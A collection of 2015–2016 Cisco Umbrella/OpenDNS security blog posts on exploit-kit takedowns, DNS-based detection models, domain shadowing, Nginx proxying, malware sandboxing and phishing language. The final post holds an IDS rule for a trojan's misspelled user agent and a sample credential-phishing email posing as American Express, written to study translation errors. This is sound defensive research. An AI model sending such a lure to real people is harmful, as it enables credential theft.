{"website": "Cisco-Umbrella", "title": "Cisco Disrupts Major Ransomware Campaign", "author": ["Stephen Lynch"], "link": "https://umbrella.cisco.com/blog/cisco-disrupts-major-ransomware-campaign", "abstract": "Security professionals generally spend their lives playing defense against adversaries that are not only anonymous, but often invisible. It’s a rare event when hackers and malware authors have their operations curtailed, shutdown or even impacted by members of the infosec community… and even more rare when the community can get an inside look at the infrastructure running these campaigns. That’s why today’s announcement — disclosing Talos Research Group’s work to disrupt the operations of an international ransomware campaign and compromise the infrastructure of one of the most effective methods for distributing malicious software around the world — is so significant. The Angler exploit has been linked to several high­-profile ransomware campaigns, including both CryptoWall and TeslaCrypt. Angler is widely recognized as one of the most advanced and exploit kits on the market — making the information Talos disseminated all the more important for analysts and engineers who are working to protect their company systems from attacks. Graph of Angler exploit kit network connections, courtesy of OpenDNS Security Labs Detailing the takedown in a report on the Cisco Security blog , Talos was able to disrupt the operations of a threat actor responsible for up to 50 percent of the malicious software’s activity from a ransomware campaign that generated more than $30M USD annually. Based on the Angler servers Talos observed, this one actor targeted up to 90,000 victims every day. More than 60 percent of the infections delivered either CryptoWall 3.0 or TeslaCrypt 2.0 ransomware, both variants that have been discussed previously on the OpenDNS Security Labs blog. But beyond simply sinkholing the domains or shutting down the servers, Talos worked with service provider Limestone Networks to obtain live disk images of the Angler servers. This collaboration allowed Talos researchers to observe the attack campaigns in action, providing valuable information not only on how Angler’s handlers hid their operations from security researchers, but how they architected their infrastructure to ensure maximum effectiveness. Angler Infrastructure: More than Meets the Eye One of the most interesting new technical findings from Cisco’s in-depth analysis of the Angler servers was the use of proxies to shield the rest of the exploit infrastructure from investigation. According to Talos’s full report, a single health server was seen monitoring 147 proxy servers over the span of a month. As the report’s authors explain, these proxy servers allow the adversaries “to quickly pivot and change while still shielding the exploit server from identification and exposure.” OpenDNS CTO Dan Hubbard explained that the practice of using proxy servers is not yet widespread, but it does reflect a trend towards the increased sophistication of so-called “commodity” attack campaigns. “Inevitably, you have to get the data collated somewhere and if that server gets taken away, then that’s the end of it,” he said. “As a result, we’re seeing criminals build up these sophisticated proxy networks so they can scale linearly, much like a CDN or a real web service. Not only can any of these proxies be taken down without affecting service, but it allows them to obfuscate their true infrastructure. While you may think ‘that’s the command-and-control server,’ actually it’s not. It’s just an intermediary between the proxy servers and the real command-and-control or exploit server.” “Behind the scenes, the criminals have to prepare for robustness, redundancy and scale…much like the good guys do,” Hubbard adds. “If they don’t, they will be taken down, taken over and be ineffective. The smarter attackers end up building these very robust transient networks where one piece can go down and the rest keeps running.” Cross-team Collaboration “Within 10 days of the Cisco acquisition, we were sharing data with the Talos team,” Hubbard added. “We were exchanging data and research on TeslaCrypt and Angler, which helps paint a picture of the operators’ infrastructure.” He added that OpenDNS Security Labs and Talos experts have collaborated before on other projects, due to their shared research interests. That research, and the data on Angler collected by both OpenDNS and Talos is as broad as it is deep. Starting in June 2013 at BSides Raleigh, OpenDNS Research Labs’ Dhia Mahjoub first described Angler’s use of the “domain shadowing” technique to evade detection by network security products. This behavior was later also described by Talos researchers Nick Biasini and Joel Esler in an in-depth analysis of Angler published in March of this year . Mahjoub further described Angler’s architecture in talks at Virus Bulletin, Black Hat and other conferences during 2014 . Hubbard said that one of the takeaways from this latest takedown is how OpenDNS and Talos researchers can leverage their different, but mutually-reinforcing skills to uncover other ongoing campaigns. “OpenDNS has developed very accurate models that can predict where attackers behind Angler are going to move next. For example, we can analyze traffic spikes and how these spikes relate to the Angler infrastructure that attackers own versus other online infrastructure,” said Hubbard. “Because we see all of the DNS traffic, we know there are connections in our graph of data that indicate people who are infected with Angler get CryptoWall and also TeslaCrypt. But Talos actually had a hunting team that was able to go in and pull the infrastructure out. This ability, combined with the great sample data Talos has through Threat Grid and AMP can provide real attribution to attacks.” For more information about Angler, exploit kits and today’s announcement, check out the infographic below. For more detailed information from the Talos team, visit the Cisco Security blog .", "date": "2015-10-06"},
{"website": "Cisco-Umbrella", "title": "OpenDNS Update Adds IP Layer Enforcement to Umbrella", "author": ["Owen Lystrup"], "link": "https://umbrella.cisco.com/blog/opendns-adds-ip-layer-enforcement-umbrella", "abstract": "Protecting company data with a workforce that is increasingly more mobile is a difficult task. Today, OpenDNS announced a feature update that will further the company’s long-term goal to recreate the network security stack in the cloud and protect endpoints no matter where employees use them. For years , malware authors relied on large numbers of cheap domain names to serve their attacks, because registrars can easily block or take down domains determined to be malicious. A small percentage of targeted attacks, however, use hardcoded IP addresses to initiate communication from within a company’s network, which bypasses the DNS security layer. OpenDNS Senior Product Marketing Manager Barry Fisher says IP enforcement will be key in this small percentage of attacks, providing protection for endpoints that are not on a company’s network or not always connected to a VPN. A recent example of direct-IP attacks include the Trojan “Upatre,” which uses direct IP connections to initiate further malware installs. In recent attacks, it delivered the Dyre trojan, which steals banking login credentials from infected computers. According to Fisher, this type of attack might be prevented if an employee is on a company network behind a firewall, but many security solutions only work on certain ports and only when an employee is working on site. Alternatively, OpenDNS’s IP layer enforcement provides protection over any port, and from any location through the use of the OpenDNS Roaming Client, an endpoint client that acts as a DNS request forwarder. IP layer enforcement works by checking traffic against a comprehensive list of suspect IP addresses from an OpenDNS threat intelligence database in realtime. If traffic from an endpoint matches an IP from the suspect list, it injects a route to OpenDNS servers and blocks the connection if it is malicious. The IP layer enforcement feature is an update to OpenDNS Insights, Platform and MSP packages. Click here to find out more.", "date": "2015-11-03"},
{"website": "Cisco-Umbrella", "title": "Lets Talk About Proxies, Pt. 2: Nginx as a Forward HTTP Proxy", "author": ["Aram Grigorian"], "link": "https://umbrella.cisco.com/blog/lets-talk-about-proxies-pt-2-nginx-as-a-forward-http-proxy", "abstract": "Note: This is part two of my previous post on proxies. When I first started at OpenDNS, my first task was to figure out how Nginx works and write a custom C module for it to handle some business logic. Nginx was going to reverse proxy to Apache Traffic Server (ATS), which would do the actual forward proxying. Here is a simplified diagram: Nginx turned out to be easy to understand and work with. This was in contrast with ATS, which is bigger, more complex, and just plain not fun. As a result, “Why don’t we just use Nginx for the whole thing?” became a popular question, especially after it was decided that the proxy will not be doing any caching. Forward Proxy Though Nginx is a reverse proxy designed to be used with explicitly defined upstreams: http {\n upstream myapp1 {\n  server srv1.example.com;\n  server srv2.example.com;\n  server srv3.example.com;\n }\n server {\n  listen 80;\n  location / {\n   proxy_pass http://myapp1;\n  }\n }\n} It’s also possible to configure it to use an upstream based on some variable, like the Host header: http {\n server {\n  listen 80;\n  location / {\n   proxy_pass http://$http_host$request_uri;\n  }\n }\n} This actually works just fine. The main caveat is the Host header can match a pre-defined upstream{} in the config, if any exist: http {\n ...\n upstream foo {\n  server bar;\n }\n ...\n server {\n  listen 80;\n  location / {\n   proxy_pass http://$http_host$request_uri;\n  }\n }\n} Then a request like this will match foo and be proxied to bar : GET / HTTP/1.1\nAccept: */*\nHost: foo The approach can be extended a bit with the use of new variables within a custom module, instead of the built-in $http_host and $request_uri for better destination control, error handling, etc. That all works wonderfully — note that this is an HTTP (port 80) proxy and we are not considering the HTTPS case here; for one thing, Nginx does not recognize the CONNECT method used in explicit HTTPS proxying so that would never work. As I mentioned in my previous blog post , our Intelligent Proxy takes on a more unconventional approach in general. A big question is performance. Our initial load tests with ATS resulted in less-than-ideal numbers. Does this Nginx ‘hack’ have any effect on how well it performs? Load Test Skipping over the finer details, our setup uses wrk as the load generator and a custom C program as the upstream. The custom upstream is very basic; All it does is accept connections and reply with a static binary blob to any request that looks like HTTP. Connections are never closed explicitly to remove any potential skew in the results from unnecessary extra TCP sessions. We first establish a benchmark by loading the upstream server directly: Running 30s test\n 10 threads and 100 connections\n Thread Stats Avg Stdev Max +/- Stdev\n Latency 3.27ms 680.48us 5.04ms 71.95%\n Req/Sec 3.21k 350.69 4.33k 69.67%\n 911723 requests in 30.00s, 3.19GB read 100 total connects (of which 0 were reconnects)\nRequests/sec: 30393.62\nTransfer/sec: 108.78MB Everything looks good, wrk created 100 connections as expected and managed to squeeze out 30k requests per second. Now let’s repeat that while going through our Nginx forward proxy (2 workers): Running 30s test\n 10 threads and 100 connections\n Thread Stats Avg Stdev Max +/- Stdev\n Latency 6.42ms 14.37ms 211.84ms 99.50%\n Req/Sec 1.91k 245.53 2.63k 83.75%\n 552173 requests in 30.00s, 1.95GB read 5570 total connects (of which 5470 were reconnects)\nRequests/sec: 18406.39\nTransfer/sec: 66.53MB This almost halves the possible throughput.. something is not right. Doing a few manual requests, we see that going through Nginx doesn’t really add any significant latency. The Nginx workers got close to 100% CPU usage during the test, but bumping the worker count doesn’t help much. What about the upstream, what does it see in the two cases? After a quick update to print some stats, everything looks good in the direct case — the numbers reported by wrk and the upstream server match up as expected. But we find something startling in the proxy case when looking at the upstream server stats: status: 552263 connects , 552263 closes, 30926728 bytes, 552263 packets Looks like Nginx created a new connection for every single request going upstream, even though wrk only made 100 connections downstream… Diving into the Nginx core and reading the documentation more thoroughly, things start to make sense. Nginx is a load balancer, where “load” equals requests, not connections. A connection can issue an arbitrary number of requests, and it’s important to equally distribute these among the backends. As it stands, Nginx closes upstream connections after each request . The upstream keepalive module tries to remedy this slightly by keeping a certain minimum number of persistent connections open at all times. Nginx Plus offers extra features like Session Persistence (and by the way, an equivalent open source module exists as well) — enabling requests to be routed to the same upstreams more consistently. What we really want is a 1-to-1 persistent connection mapping between clients and their respective upstreams. In our case, the upstreams are completely arbitrary and we want to avoid creating unnecessary connections, and more importantly not “sharing” upstream connections in any way. Our session is the whole client connection itself. The Patch The solution is fairly straightforward, and we’ve made it available on Github *. Re-running the load test with this change we get much better results, outlining the importance of keeping TCP connections persistent and avoiding those costly opens/closes: Running 30s test\n 10 threads and 100 connections\n Thread Stats Avg Stdev Max +/- Stdev\n Latency 10.82ms 48.67ms 332.65ms 97.72%\n Req/Sec 3.00k 505.22 4.46k 95.81%\n 854946 requests in 30.00s, 3.02GB read 8600 total connects (of which 8500 were reconnects)\nRequests/sec: 28498.99\nTransfer/sec: 103.01MB The numbers on the upstream match up to that of wrk: status: 8600 connects , 8600 closes, 47882016 bytes, 855036 packets There is still a problem, however. There are 8,600 connections instead of just 100; Nginx decided to close a lot of connections both down and up stream. When debugging to see why, we end up tracing back to “lingering_close_handler”: ... nginx: _ngx_http_close_request(r=0000000000C260D0) from ngx_http_lingering_close_handler, L: 3218 nginx: ngx_http_close_connection(00007FD41B057A48) from _ngx_http_close_request, L: 3358\n... Since the overall performance even with this behavior is satisfactory, that’s where I left it for the time being. In Closing We’ve been running Nginx as a forward HTTP proxy in production for some time now, with virtually no issues. We hope to continue to expand Nginx’s capabilities and push new boundaries going ahead. Keep an eye out for future blog posts and code snippets/patches. *This is a rewritten patch (the original was a bit hacky), this new code has gone out to production just recently. If any issues creep up, I’ll update the public patch with any adjustments.", "date": "2015-11-03"},
{"website": "Cisco-Umbrella", "title": "OpenDNS Advances Predictive Security Using Data Science and Sound Wave Technology", "author": ["Stephen Lynch"], "link": "https://umbrella.cisco.com/blog/opendns-cracks-predictive-security", "abstract": "In November 2012 at the SF Data Mining Meetup , OpenDNS CTO Dan Hubbard shared the stage with data scientists from Pandora. On the surface, the two companies couldn’t have appeared more different that night — one an Internet security company, the other an early pioneer in Internet radio. But when it comes to data science the companies are similar in that they both rely on having unique sets of data no other company can match. During this particular meetup, Hubbard outlined a new approach to using data science for network security. He explained the unique view OpenDNS had of the world’s constantly-shifting Internet addresses and how this vantage point resulted in powerful insight into the traffic patterns of millions of daily users. Now, almost three years later under Hubbard’s leadership, OpenDNS is unveiling two new detection models that have been developed by the company’s data science team. The first new model, called Spike Rank (SPRank), is a detection system that uses mathematical concepts more commonly used to analyze sound waves in real time — much like similar techniques used for Pandora’s Music Genome Project. The second model, Predictive IP Space Monitoring, uses the clues uncovered by SPRank to anticipate attacks before they take place. Together the two models expand the company’s applied artificial intelligence system for blocking online attacks. Taking a Data Science Approach to Security From the beginning, Hubbard realized that OpenDNS’s millions of users around the world gave his team a dataset that was unlike any other, even among security companies. The company sees over 80 billion Internet requests daily and has access to years’ worth of network traffic data. Starting in 2012, Hubbard began to build the OpenDNS Security Labs research team, making sure to include a mix of specialized security researchers and hardcore data scientists. He was looking to adopt a hybrid approach that would use data-centric techniques to revolutionize traditional security research. One of the first researchers Hubbard brought on board was Dhia Mahjoub, Ph.D, a data scientist with specific expertise in distributed sensor networks. During that same data mining meetup in 2012, OpenDNS’s research team outlined a model that already could predict domain names generated by the notorious Cryptolocker ransomware and some botnets. By late 2013, this predictive system could identify and block connections to the domain names used by malware — days or even weeks before attacks were launched. As a next step, Mahjoub shifted focus to study the more complex attacks based on exploit kits, one of the most popular forms of malicious software used to infect computers. Once an unsuspecting user’s machine has been compromised, bad actors can add the infected machine to a botnet, steal online banking information, or install further malware. For example, in one recent case, a campaign taken down by Cisco’s Talos research team was estimated to generate more than $30 million for criminals, annually. Through his work, Mahjoub discovered that the criminals behind the latest wave of attacks were using an entirely different set of approaches to hide the servers they set up to power their campaigns from detection. They would automate the process of using legitimate websites and domains that they had already hacked to make malicious web traffic look legitimate. Other criminals would launch entirely new domains, hosted in the dark corners of the Internet or use a network of proxy servers to hide their online activities. These evasion techniques made it very difficult for an automated system to detect if a new subdomain should be blocked or not, until a significant amount of time (weeks or months) had passed after an attack had already been launched. Finding “Ghost Noises” To tackle the problem of identifying criminals online, Mahjoub enlisted the help of fellow OpenDNS data scientist Thomas Mathew. Together, the two began looking for patterns in network requests for compromised websites — trying to find a method that would reliably detect these attacks. “We started asking ourselves questions such as ‘What are a set of features that are hard for criminals to change? What is something that people don’t really think about?’” Mathew said. “Then I realized…if you’re thinking about network traffic, it’s really nothing more than a waveform.” By looking at the network traffic in OpenDNS’s dataset as patterns, Mahjoub and Mathew could see that some domains (like gmail.com or amazon.com) have consistent high-volume incoming traffic. Others might have sudden spikes in traffic at regular intervals or follow some other pattern entirely. Mathew began cross-referencing these newly-discovered traffic patterns with the data already in Security Graph, OpenDNS’s database of “good” and “bad” Internet addresses. By examining how traffic patterns changed after they became malicious, Mathew realized that the traffic patterns closely echoed the sound waves that companies like Pandora classify every day. “There’s already lots of mathematical theory that exists to describe sounds,” Mathew said. “Domains like Google and Yahoo! will have a similar ‘sound wave,’ because they get lots of regular traffic. The domains used in these attacks are only alive for a certain amount of time, so their patterns are much faster and shorter. To continue the analogy, these attacks sound like ghost noises — short beeps or chirps. Imagine a sound that appears for just a second and then is gone. You need to build a system that can match that pattern and identify those sounds as quickly as possible.” Quickly, Mahjoub and Mathew discovered that this new system functioned as a kind of sonar for network security — it was able to quickly locate these transient patterns in the more than half a terabyte of traffic data that OpenDNS processes on an hourly basis. As they cross-referenced the domains tagged by SPRank (this new, patent-pending recognition system) with other systems, they found that it could identify these malware attack patterns with a high degree of accuracy. Now in production, the model identifies hundreds of compromised domains every hour — over a third of which are not detected by any other antivirus or antimalware scanner, according to VirusTotal. But even as they implemented a new system for identifying attacks in progress, the two wondered — how could they zero in on these attacks before they occurred? Anticipating the Next Attack After spending nearly two years studying how criminals were hiding “bad” domain names among “good” ones online, Mahjoub concluded that another model would be needed to predict attacks before they occur. Mahjoub used a more granular approach that catalogued the “fingerprints” left by bad actors’ collective infrastructure. He found that this method could identify over 300 new domains every hour that would be used to host malware in the future… allowing him to block these domains before an attack is ever launched. Called Predictive IP Space Monitoring, this new model starts with the initial ‘clues’ found by SPRank. It uses eight major patterns in how servers are hosted to determine which domains will be the source of future malicious activity. For example, Mahjoub uncovered a new technique called domain shadowing, or using a compromised subdomain for a legitimate website (like “bad.opendns.com” instead of “opendns.com”) as the base for launching an attack. He also discovered how attackers could hide server addresses in a legitimate hosting provider’s infrastructure by manipulating the connections between networks. While no one indicator predicts an attack by itself, Mahjoub has been able to train his model over time by cross-referencing the list of predicted malicious servers with those that were actually involved in attacks. Click to enlarge This new model essentially scores every step in the process that a criminal goes through to set up their own infrastructure — from choosing a hosting provider to deploying server images — to determine whether an attack is going to take place. By focusing on these unchangeable characteristics, Mahjoub’s model is able to ignore the individual evasion techniques that criminals employ and focus on identifying the overall pattern that precedes malicious activity. “With this system, SPRank finds the clues, but analyzing the overall hosting infrastructure with Predictive IP Space Monitoring cracks open the case,” Mahjoub said. Mahjoub is the first to say that this new artificial intelligence system in use at OpenDNS isn’t static. The point, he says, is that the bad guys are constantly finding new ways to hide online which forces the team’s own models to constantly adapt and learn from new data. “When we build a model, it’s not like we can just build it and then go to bed,” Mahjoub said. “You need to constantly update it, because the bad guys are doing the same thing on their end.” To learn more about this new approach to security, check out the OpenDNS Security Labs blog and infographic .", "date": "2015-11-19"},
{"website": "Cisco-Umbrella", "title": "OpenDNS Sheds Light on Domain Shadowing", "author": ["Owen Lystrup"], "link": "https://umbrella.cisco.com/blog/opendns-provides-sheds-light-on-domain-shadowing", "abstract": "In March this year the Talos Security group at Cisco coined a name for an attack that hackers have been using since 2011 at least. Domain Shadowing is when an attacker gains admin access to a legitimate domain, and uses that legitimate domain to register a large amount of shady subdomains, usually with an exploit kit . For instance, visapayment.opendns[.]com instead of opendns[.]com. It’s becoming more common because of how easy it is to run a domain shadowing attack, and how hard they are to detect. Using a Stolen Reputation “Domain shadowing using compromised registrant credentials is the most effective, difficult to stop, technique that threat actors have used to date. The accounts are largely random so there is no way to track which domains will be used next. Additionally, the subdomains are very high volume, short lived, and random, with no discernible patterns. This makes blocking increasingly difficult,” Cisco threat researcher Nick Biasini explained in his blog post about Domain Shadowing. The worst part is owners of the legitimate domain are often not aware it is being used for Domain Shadowing. OpenDNS Security Labs researchers have also been tracking the rising popularity of exploit kits, and responded with a new security models and features to detect them. One feature is an addition to OpenDNS’s threat intelligence search engine, Investigate. Called Pattern Search, the feature essentially adds regular expression and wildcard searching to the search engine, allowing for much more correlative results. SPRank and Predictive Discovery Pattern Search in action looking for DGAs. Currently most blocking and detection mechanisms for Domain Shadowing rely on some sort of domain reputation system that rates good versus bad domains. But reputation scores, according to Technical Leader Dhia Mahjoub, are not enough to catch most Domain Shadowing attacks. Mahjoub along with Security Researcher Thomas Mathew recently announced a new security model get around this issue. “Compromised domains that have a great historical reputation will easily fool a reputation system,” Mahjoub wrote in a blog post .  Furthermore, cheap hosting makes it difficult to assign meaningful scores for IP reputation as new ranges appear having no historical context to provide it a score. SPRank avoids these issues by analyzing the DNS request patterns to a domain.” In other words, reputation scores, upon seeing a C Name like Amazon[.]com, will give a compromised subdomain a pass, since Amazon is a well-known and highly reputable site. How to Further Protect Against Domain Shadowing Aside from advanced security solutions like Investigate, the key to protecting against Domain Shadowing lies in protecting the credentials of your site’s registrant, and monitoring for changes on the domain’s registrant account. “It’s one thing that people just don’t do,” Craig Williams, security outreach manager for Cisco Talos, told ThreatPost in an interview. “No one logs back into their registrant account unless they are going to change something, or renew it.” Two-factor authentication is probably the first, most effective precaution. Most domain registration companies, even the often abused GoDaddy, offer two-factor authentication. Using it will ensure that even if admin credentials are compromised, they can’t be used to register a new malicious domain. To find out more about IP Space Monitoring, read Mahjoub’s blog post (linked above) — also includes an in-depth explanation of SPRank. To see the Pattern Search function in action, read the blog post by Security Researcher Chip McSweeney who used it in an experiment to find DGAs with Python.", "date": "2015-11-24"},
{"website": "Cisco-Umbrella", "title": "New Cuckoo for You", "author": ["Kevin Bottomley"], "link": "https://umbrella.cisco.com/blog/new-cuckoo-for-you", "abstract": "Cuckoo Round Two In reality, that title is a bit misleading, as what I’m about to tell you isn’t really anything “new.” However, it is new(er) for me. Back in June , I gave a run down of how to set up and use your own dynamic malware analysis system using an open source project called Cuckoo Sandbox . Out of the box, Cuckoo works great on its own; no complaint here. But, out of the box does not always mean everything is going to work as needed all of the time. A couple of months after my last blog post, I was running lots of samples through the Cuckoo API that were automatically downloaded from a repository where I have some Yara rules that look for some type of specific badness or the other. This was working out fine and dandy, until one day I noticed that my system kept core dumping and going into kernel panic mode. I struggled with this problem for several days, doing everything I could to try and fix the problem: updating and upgrading the system, running fewer samples, reinstalling packages, all to no avail. After some conversation with other researchers in the security industry, it came to my attention that the specific malware I had been hunting had started to employ a defensive tactic by making lots and lots of useless API calls, in the attempt to break the analysis by filling up the database and thus crashing the system. This appeared to be a very effective means of making my day harder — obviously the intended result. Luckily, in the same conversation, I was pointed to a fork of Cuckoo with some modifications to deal with this exact problem, as well as a few others. Per the README.md , the fixes and additions include: Fully-normalized file and registry names 64-bit analysis Handling of WoW64 filesystem redirection Many additional API hooks Service monitoring Correlates API calls to malware call chains Ability to follow APC injection and stealth explorer injection Pretty-printed API flags Per-analysis Tor support Over 130 new signature modules (over 70 developed solely by Optiv) Anti-anti-sandbox and anti-anti-VM techniques built-in More stable hooking Ability to restore removed hooks Greatly improved behavioral analysis and signature module API Ability to post comments about analyses Deep hooks in IE’s JavaScript and DOM engines usable for Exploit Kit identification Automatic extraction and submission of interesting files from ZIPs, RARs, RFC 2822 emails (.eml), and Outlook .msg files Direct submission of AV quarantine files (Forefront, McAfee, TrendMicro, Kaspersky, MalwareBytes, MSE/SCEP, and SEP12 formats currently supported) Automatic malware classification by Malheur Significant contributions from Jeremy Hedges , William Metcalf , and Kevin Ross Hundreds of other bugfixes To be completely honest I don’t know which one of these “fixes” actually took care of my database problem, but it did indeed work as I was told it would. Soon after re-installing, I was back up and running and all of my core dump problems went away. Once again, I was a happy little analyst. One of the cooler aspects to this update I noticed was the ability to change the database to use Elasticsearch , thus allowing the use of the entire ELK stack as a built-in feature. If you have never used ELK before, I highly recommend checking it out. Its versatility goes far beyond just making pretty graphs for dynamic malware analysis, as can be seen in the following example (which is not relevant to information in this blog): (source: http://www.digitalgov.gov/files/2014/05/600-x-333-ELK-dashboard-deck.jpg) With the addition of more than 100 signatures for detection, TOR for obfuscation, ELK for fancy, pretty graphs, anti-anti-virtual machine capabilities, and much more, I would have to recommend, if nothing else, to at least try this modified Cuckoo fork and decided for yourself. But I’m pretty sure you will agree its enhancements are well worth it.", "date": "2015-12-15"},
{"website": "Cisco-Umbrella", "title": "How the Global Cybercrime Economy Hides in Plain Sight", "author": ["Stephen Lynch"], "link": "https://umbrella.cisco.com/blog/cybercrime-economy-exploit-kits", "abstract": "Last month, the crime rate for England and Wales nearly doubled thanks to the inclusion of a new crime category in government statistics: cybercrime. The new data, released by the U.K.’s Office for National Statistics (ONS), includes an estimated 5.1 million online fraud incidents and 2.5 million instances that meet the country’s legal definition of computer crime. These new categories dramatically increase the country’s crime rate to over 11.6 million total offenses. Given the media attention devoted to nation state attacks and high-profile data breaches, it’s easy to think that the prevalence of online crime is due to the rise of a new breed of elite hackers. But contrary to common perception in the media, this increase electronic attacks is actually being driven by the commoditization of both the tools and infrastructure used to launch online attacks, according to statements from U.S. officials at both the state and federal level. Exploit Kits: The New Normal As previously reported on the OpenDNS Security Labs blog , one of the biggest driving forces behind the recent rise in financially-motivated cybercrime has been the increased use of exploit kits. In a statement to CRN last year , FBI Assistant Director George Venizelos said that crimeware kits enable anyone with “$40 and a computer” to potentially become a cybercriminal. Available for purchase online, these popular crimeware toolkits — also known as exploit kits — work by attacking a known vulnerability in a computer’s software or operating system to deliver an initial, malicious payload. The infected machine can then be added to a botnet, used to steal online banking information or be held hostage by ransomware (like Cryptowall and CryptoLocker). While these exploit kits and malware are available for purchase online, criminals still need a stage from which to launch their attacks. Sneaky Servers Historically, exploit kits and other malware have either been hosted on hacked websites or on servers run by “bulletproof” hosting providers that cater to shady online activities. Dhia Mahjoub, senior security researcher at OpenDNS, outlined some of the operating processes of these hosting providers during a recent talk at the Hack.lu cybersecurity conference in Luxemborg. “One of the biggest advantages that these hosting providers have is they can choose to operate in countries that spend less time and effort on preventing cybercrime,” Mahjoub said. Hosting providers often locate their data centers in countries where there cybercrime laws are lenient or even accepting of activities like distributing malware. Often, the hosting providers’ businesses themselves are also registered in foreign countries, relying on national borders to shield them from law enforcement activity. Mahjoub said that some providers are bound by law to tell their customers when they receive an abuse report from security researchers or law enforcement. He said that often these reports result in criminals just copying their servers and setting them up in another dark corner of the Internet. In many cases, hosting providers deal with so many customers and servers that malicious behavior simply goes unnoticed. He also noted that detecting and blocking these attacks is no trivial matter, and that attackers have found many ingenious ways of hiding from both law enforcement and security researchers. One technique he uncovered is called “domain shadowing,” or using a compromised subdomain on for a legtimate website (like “malware.opendns.com” instead of “opendns.com”) to launch exploit kit attacks. He also found that attackers could “inject” server addresses into a legitimate hosting provider’s networks by manipulating the routes between networks, further obscuring a server’s true location. In another example, a recent Angler exploit kit group taken down by Cisco’s Talos team used a network of proxy servers to hide an attacker’s infrastructure from the prying eyes of security researchers. This combination of automated attacks and evasion techniques is a hallmark modern exploit kit infrastructure. Last month, OpenDNS Security Labs introduced two new security models, SPRank and Predictive IP Space Monitoring , that can automatically detect these kinds of attacks. Using Big Data to Avoid Detection Aggressive activity from security teams can sometimes backfire. Back in 2012 , Mahjoub said that it became apparent that traditional, “active” security research methods like actively scanning attacker infrastructure, could alert black hats that security researchers were looking for them. After realizing that they are under scrutiny from the security community, bad guys would then shut down servers and start over in another dark corner of the Internet. He mentions that in one instance, bad actors updated their infrastructure and changed their methods within hours of researchers disclosing information about how they operate. That’s why, he says, the OpenDNS Research Labs team has focused is on studying the aspects of criminal activity that are impossible to hide from outside analysis. He notes that while it’s possible for a criminal to change hosting providers or domain names, there are some things that still need to happen before an infection can occur. For instance, a criminal needs to register a domain before it becomes public and users have to be redirect to a specific website before an exploit kit can infect them. “To detect these people, you have to separate their inherent and assigned features,” he said. “Think of it this way: a criminal could have 10 passports that [he uses] to travel all over the world, changing [his] hair color or whatever. That’s analogous to what bad guys do to hide online. They will change the domain names they use, the countries they host their servers in — all to avoid detection. But if you focus on inherent features — like the exploit kit traffic patterns — it’s like their genetic code. Some things you just can’t change.”", "date": "2015-12-17"},
{"website": "Cisco-Umbrella", "title": "Grammar and Spelling Errors in Phishing and Malware", "author": ["Josh Pyorre"], "link": "https://umbrella.cisco.com/blog/grammar-and-spelling-errors-in-phishing-and-malware", "abstract": "Mistakes happen. You’re in a hurry or spell check modifies a word, creating a grammatical error in its place. But what about all the poorly written phishing emails, off-putting malware names or their misspelled user agents? Cybercriminals are able to write a program and orchestrate a maze of elaborate fraud schemes, but just can’t seem to get the wording right. If those criminals can put so much effort into creating phishing attempts that appear to be from a legitimate bank, why wouldn’t they also proofread emails or double check the user agent used in C&C communications. Let’s take a look at some examples, starting with malware. Upatre has been used as a dropper that installs banking malware like Zeus or Dyre. Those malware families typically attempt to capture banking credentials on a victim’s computer. Upatre is often delivered via a phishing email (which was probably misspelled). When Upatre calls out, it attempts to look like legitimate traffic. The traffic has a HTTP GET request and a user agent, but the user agent is a bit off. This spelling oversight makes it much easier to detect and mitigate. The following IDS rule looks for exactly that misspelled user agent: alert http $HOME_NET any -> $EXTERNAL_NET any (msg:”ET TROJAN Mazilla Suspicious User-Agent Jan 15 2015″; flow:established,to_server; content:”User-Agent|3a| Mazilla /”; http_header; fast_pattern:12,7; reference:url,malware-traffic-analysis.net/2015/01/15/index.html; classtype:trojan-activity; sid:2020235; rev:3;) Another example isn’t actually malware. It’s a check-in for an LG brand smart TV. The network traffic looks like it’s from a web browser. However, the user agent is misspelled. This would trigger an IDS alert if it was looking for unusual user agents with regex patterns, and it would probably be classified as a false positive after some quick incident response. Let’s switch over to phishing. The following three samples were seen in the wild. They are either missing some words that are considered important when completing sentences in English, or they simply read as if a child wrote them. This email wants the victim to validate an email account because it’s full: This email is stating that the victim needs to upgrade an email account to an unlimited data plan: And this one actually wants you to send your username and password in the reply: In an attempt to guess at what’s going on, we’re going to create our own phishing email targeted at an English speaker, but written from the perspective of a phishing author who doesn’t speak English. The assumption is that the author would write a grammatically correct email in their language and then use Google translate to convert it to English. Here’s our legitimate-sounding phishing email, written in English before using google translate: Dear Card holder, We have detected unusual login activity associated with your bank account. Please re-confirm your account information and update your profile with us by visiting the following page: <link> Thank you for being a valued customer. 2014 American Express Account Security Fraud Prevention Network. Andrew Mei, one of our previous security research interns, wrote a grammatically correct version of this email in Cantonese. We then used Google translate to convert it to English. Here’s what we got: Andrew mentioned that the term, “Dear CardHolders” is something one might say to a lord over a hundred years ago and there isn’t an equivalent term in English. “If you are a club member” is odd since you should be a “member” if receiving the email, and what “club” is this? And finally, the lack of punctuation creates a run-on sentence. For the next version, Artsiom Holub, our Russian-speaking security analyst, wrote a grammatically correct version of the text in Russian, which was translated to English using Google translate: This looks a little better than the Cantonese version, but still has errors. There’s a “(th)” between “Dear” and “card holder” and the signature line is messed up. However, it’s got the right punctuation and doesn’t mention anything about “club members.” IDS signatures will catch malicious software with misspelled user agents and other attributes, but email is often not passed in the clear. Additionally, IDS signatures are fairly ineffective against bulk text seen in an email. Since all phishing emails are going to be sent without end-to-end encryption (unless it’s some sort of advanced, targeted attack in which a private encryption key might already have been compromised), emails could possibly be analyzed on the wire using natural language processing. OpenDNS already utilizes natural language processing along with other techniques to automatically classify unusual domain names seen being requested by users of OpenDNS. If a client is performing a DNS lookup for paypa1[.]com (notice the number 1 instead of the letter ‘L’), we will automatically use that information in classifying that domain as malicious. With just a little effort from an enterprising system administrator, it could be possible to build a local system using similar techniques to analyze the clear text emails as they come into an email pooling system. The errors in phishing are useful though. The emails that make it past spam filters have one final filter to pass through: the user. Vigilance in reading the email and noting where it originated and how it uses language are great steps in staying secure from phishing.", "date": "2016-02-08"},
